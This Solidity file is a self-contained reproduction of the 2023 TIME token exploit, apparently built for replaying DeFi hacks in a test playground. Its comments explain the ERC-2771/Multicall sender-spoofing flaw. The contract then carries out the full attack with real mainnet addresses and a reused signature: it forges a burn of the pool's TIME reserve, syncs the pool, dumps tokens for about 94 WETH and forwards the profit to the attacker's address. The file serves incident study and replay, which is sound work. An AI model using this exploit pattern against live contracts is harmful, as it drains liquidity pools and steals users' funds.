// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-12-TIME).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `ContractTest`
// contract (inherits Test; uses cheatcodes: vm.createSelectFork in setUp() and
// deal() for the 5 ETH working capital), so there is no standalone contract to
// deploy. This is a faithful, self-contained copy of the inline attack
// (testExploit + WETHToTIME + TIMEToWETH), so the playground can deploy it and
// record testExploit(). Logic and constants are copied verbatim from
// test/TIME_exp.sol. Plain Solidity: no Test, no cheats. The 5 ETH working
// capital (test's `deal(address(this), 5 ether)`) is forwarded to this
// contract in the unrecorded setup phase instead.
//
// Root cause (ERC-2771 + Multicall arbitrary _msgSender() spoofing, disclosed
// by OpenZeppelin Dec 2023): TIME is a thirdweb TokenERC20 that is BOTH an
// ERC-2771 meta-tx recipient (trusts a Forwarder; reads the logical sender from
// the LAST 20 BYTES of calldata whenever msg.sender is the trusted forwarder)
// AND a Multicall that batches sub-calls via delegatecall(data[i]). A
// delegatecall preserves msg.sender (still the trusted Forwarder) but lets the
// caller supply the ENTIRE calldata of the sub-call. So the attacker crafts
// datas[0] = burn.selector ++ amount ++ <spoofed address> and wraps it in
// multicall(); when routed through Forwarder.execute() (which only needs ONE
// valid, unrelated ForwardRequest signature to pass `verify` -- the signed
// `from` is irrelevant, since it never reaches the inner delegatecall),
// _msgSender() inside burn() reads the appended TIME_WETH pool address instead
// of the forwarder's real signer. burn() then executes `_burn(pool, amount)`,
// destroying ~62.2B TIME straight out of the pool's reserve with no matching
// WETH outflow. A follow-up sync() collapses the constant-product invariant,
// and the attacker dumps its pre-bought TIME into the gutted pool for ~94.5
// WETH -- unwrapped to ETH at the end.

interface IERC20 {
    function approve(address spender, uint256 value) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
}

interface IUniPairV2 {
    function sync() external;
}

interface IUniRouterV2 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external;
}

interface ITIME is IERC20 {
    function burn(uint256 amount) external;
    function multicall(bytes[] memory data) external returns (bytes[] memory results);
}

interface IForwarder {
    struct ForwardRequest {
        address from;
        address to;
        uint256 value;
        uint256 gas;
        uint256 nonce;
        bytes data;
    }

    function execute(ForwardRequest memory req, bytes memory signature) external payable returns (bool, bytes memory);
}

contract TimeMulticallSpoof {
    ITIME private constant TIME = ITIME(0x4b0E9a7dA8bAb813EfAE92A6651019B8bd6c0a29);
    IWETH private constant WETH = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IUniPairV2 private constant TIME_WETH = IUniPairV2(0x760dc1E043D99394A10605B2FA08F123D60faF84);
    IUniRouterV2 private constant Router = IUniRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IForwarder private constant Forwarder = IForwarder(0xc82BbE41f2cF04e3a8efA18F7032BDD7f6d98a81);
    address private constant recoverAddr = 0xa16A5F37774309710711a8B4E83b068306b21724;

    // Historical attacker EOA (matches config's `attacker`). Profit is
    // forwarded here at the end, mirroring the seed-forward pattern used for
    // other inline-cheatcode PoCs replayed via a synthetic exploit.
    address private constant ATTACKER = 0xFDe0d1575Ed8E06FBf36256bcdfA1F359281455A;

    /// @notice Recorded entrypoint. ETH working capital (standing in for the
    ///         test's `deal(address(this), 5 ether)`) is forwarded to this
    ///         contract in the unrecorded setup phase, so testExploit() reads
    ///         its own ETH balance directly instead of taking msg.value.
    function testExploit() external {
        TIME.approve(address(Router), type(uint256).max);
        WETH.approve(address(Router), type(uint256).max);
        WETH.deposit{value: address(this).balance}();
        WETHToTIME();

        uint256 amountToBurn = 62_227_259_510 * 1e18;
        bytes[] memory datas = new bytes[](1);
        // burn.selector ++ amount ++ <spoofed _msgSender()>. The trailing 20
        // bytes (the TIME_WETH pool address) is what ERC2771Context reads as
        // _msgSender() inside the delegatecall'd burn(), NOT the Forwarder's
        // signed `from`.
        datas[0] = abi.encodePacked(TIME.burn.selector, amountToBurn, address(TIME_WETH));
        bytes memory data = abi.encodeWithSelector(TIME.multicall.selector, datas);

        IForwarder.ForwardRequest memory request =
            IForwarder.ForwardRequest({from: recoverAddr, to: address(TIME), value: 0, gas: 5e6, nonce: 0, data: data});

        // Signature reused verbatim from the live attack tx. The signed `from`
        // (recoverAddr) only needs to pass Forwarder.verify()'s ecrecover
        // check -- it is never the address that gets burned.
        bytes32 messageHash = 0x2038560f9bee81aecd0fa852fae43c9e2a4db94c609c3b91dba5ac0f01b4d5c6;
        bytes32 r = 0x9194983a3dbfb5779c09c95f5d830d8435d9ce88b383752c3dfb8a1b84b8c9f5;
        bytes32 s = 0x11b7c750f1334e2f26ca9be32c2d070a4a023edf745b02468d6cba9a15a494c6;
        uint8 v = 27;
        require(ecrecover(messageHash, v, r, s) == recoverAddr, "bad sig");
        bytes memory signature = abi.encodePacked(r, s, v);

        // --- the exploit: spoofed burn drains the pool's TIME reserve ---
        Forwarder.execute(request, signature);
        // ------------------------------------------------------------------

        TIME_WETH.sync();
        TIMEToWETH();
        WETH.withdraw(WETH.balanceOf(address(this)));

        // Forward the resulting ETH (5 ETH seed + ~89.5 ETH drained from the
        // pool) to the attacker EOA so the recorder can score native profit.
        (bool ok,) = ATTACKER.call{value: address(this).balance}("");
        require(ok, "forward failed");
    }

    function WETHToTIME() internal {
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(TIME);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WETH.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1000
        );
    }

    function TIMEToWETH() internal {
        address[] memory path = new address[](2);
        path[0] = address(TIME);
        path[1] = address(WETH);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            TIME.balanceOf(address(this)), 0, path, address(this), block.timestamp + 1000
        );
    }

    receive() external payable {}
}
